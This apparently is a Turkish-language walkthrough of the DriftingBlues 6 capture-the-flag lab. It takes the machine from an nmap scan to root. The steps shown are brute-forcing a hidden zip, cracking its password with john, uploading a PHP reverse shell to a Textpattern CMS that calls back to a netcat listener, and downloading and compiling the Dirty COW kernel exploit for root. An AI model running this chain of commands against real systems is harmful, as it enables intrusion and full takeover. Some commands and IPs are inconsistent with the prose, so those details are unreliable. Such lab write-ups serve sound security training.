@@ -1,0 +1,148 @@
+      ####Enumeration
+Numaralandırma işlemine bir nmaptarama ile başlıyoruz.
+┌──(kali㉿kali)-[~]
+└─$ nmap $targetip      
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 02:21 MST
+Nmap scan report for $targetip
+Host is up (0.100s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 31.61 seconds
+80Portun açık olduğunu ve hedef üzerinde çalıştığını görüyoruz .
+Seçtiğimiz bir web tarayıcısını açıyoruz ve aşağıdaki ana sayfayı gördüğümüz hedef IP'ye gidiyoruz.
+
+Taramamız sırasında için nmap ile bir giriş gördük robots.txt, içeriğini görüntülemek için curl kullanabiliriz.                    
+┌──(kali㉿kali)-[~]
+└─$ curl http://$targetip/robots.txt
+User-agent: *
+Disallow: /textpattern/textpattern
+
+dont forget to add .zip extension to your dir-brute
+;)
+Gezindikten sonra /textpattern/textpattern noktasında aşağıdaki CMS giriş sayfası ile karşılaşıyoruz.
+
+İpucumuza geri dönersek, esasen siteyi özellikle .zip uzantıları arayan kaba kuvvet diziniyiz. 
+
+gobuster -x ile .zip uzantısını kullanabiliriz.
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://$targetip:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://$targetip:8080
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/07/30 00:09:53 Starting gobuster in directory enumeration mode
+===============================================================
+/spammer
+/spammer.zip
+...
+Çıktıdan için bir giriş görüyoruz spammer.zip.
+spammer.zip dosyayı makinemize indiriyoruz ve dosyayı açmaya çalıştığımızda şifre korumalı olduğunu görüyoruz .
+┌──(kali㉿kali)-[~]
+└─$ unzip spammer.zip
+Archive:  spammer.zip
+[spammer.zip] creds.txt password:               
+zip2johnHash'imizi çıkarmak için yardımcı programı kullanarak başlıyoruz .
+┌──(kali㉿kali)-[~/Downloads]
+└─$ zip2john spammer.zip > spammer.hashes
+ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0\
+┌──(kali㉿kali)-[~]
+└─$ cat spammer.hashes
+spammer.zip/creds.txt:$hashcensored:creds.txt:spammer.zip::spammer.zip
+Artık .spammer.hashes dosyamızı john ile kırmak için kullanabiliriz 
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=rockyou.txt hash 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+myspace4         (?)     
+1g 0:00:05:53 DONE (2022-07-08 07:45) 0.002832g/s 47.20p/s 47.20c/s 47.20C/s natedog..myspace4
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+Çıktıdan şifreyi görüyoruz myspace4.
+Dosyamıza dönerek şifreleri spammer.zip giriyoruz ve bir dosya görüyoruz. myspace4creds.txt
+┌──(kali㉿kali)-[~/db6]
+└─$ unzip spammer.zip 
+Archive:  spammer.zip
+[spammer.zip] creds.txt password: 
+ extracting: creds.txt               
+                                                                                           
+┌──(kali㉿kali)-[~/db6]
+└─$ cat creds.txt
+mayer:$passwordcensored
+Dosya kimlik bilgilerini gösterir mayer:$passwordcensored.
+Bu kimlik bilgilerini /textpattern/textpattern CMS sayfasında kimlik doğrulaması yapmak için kullanabiliriz.
+v4.8.3 Kimlik doğrulamasının ardından alt bilgide sürümü görüyoruz .
+
+Bölümüne giderek contentdosya yükleyebiliriz.
+php-reverse-shell.phpKali'de varsayılan olarak kurulu olan ters kabuğu değiştirerek başlıyoruz .
+49. ve 50. satırdaki IPve seçeneklerini saldırgan IP ve portumuza değiştiriyoruz .PORT
+┌──(kali㉿kali)-[~]
+└─$ cat php-reverse-shell.php 
+....
+$ip = '192.168.118.13';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+.....
+Ardından, saldırı makinemize bir dinleyici kurduk.
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 1234
+listening on [any] 1234 ...
+Şimdi içerik bölümümüze upload ediyoruz php-reverse-shell.phpve http://192.168.120.187/textpattern/files/php-reverse-shell.php adresine giderek onu tetikliyoruz.
+Son olarak, dinleyicimizde bir ters kabuk alırız,
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.118.4] from (UNKNOWN) [192.168.120.187] 47052
+Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
+ 04:11:32 up 7 min,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     tty1                      04:04    7:11   0.01s  0.01s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+.......
+
+      ####Privilege Escalation
+Numaralandırmamız sırasında uname -a, işletim sistemi adı, sürümü ve Çekirdek sürümü gibi tüm sistem bilgilerini görüntülemek için komutu kullanabiliriz.
+www-data@driftingblues:/home$ uname -a
+uname -a
+Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
+Çekirdek versiyonunu araştırırken, bizimkinin Privilege Esclation'ın Debian 3.2.78-1 bir çeşidine karşı savunmasız olduğunu görüyoruz.Dirty Cow
+İstismarı makinemize yansıtarak başlıyoruz.
+┌──(kali㉿kali)-[~/db6]
+└─$ searchsploit -m 40839
+  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
+      URL: https://www.exploit-db.com/exploits/40839
+     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
+File Type: C source, ASCII text
+
+Copied to: /home/kali/db6/40839.c
+Saldırı makinemizde bir python web sunucusu barındırıyoruz
+┌──(kali㉿kali)-[~/db6]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+Kurban makinemizdeki /tmpdizine gidiyoruz ve istismarımızı aktarıyoruz.
+www-data@driftingblues:/tmp$ wget http://$attackerip/40839.c
+Ardından, exploitimizi kullanarak derliyoruz gcc.
+www-data@driftingblues:/tmp$ gcc -pthread 40839.c -o 40839 -lcrypt
+passwd.bak Şimdi istismarı çalıştırıyoruz ve yeni oluşturulan kullanıcı olarak kimlik doğrulaması yapmak için kullanacağımız yeni oluşturulan dosya için bir şifre giriyoruz.
+www-data@driftingblues:/tmp$ su firefart
+su firefart
+Password: 
+
+firefart@driftingblues:/tmp# whoami
+whoami
+root
+rootKurban makinesine erişim sağladık .  
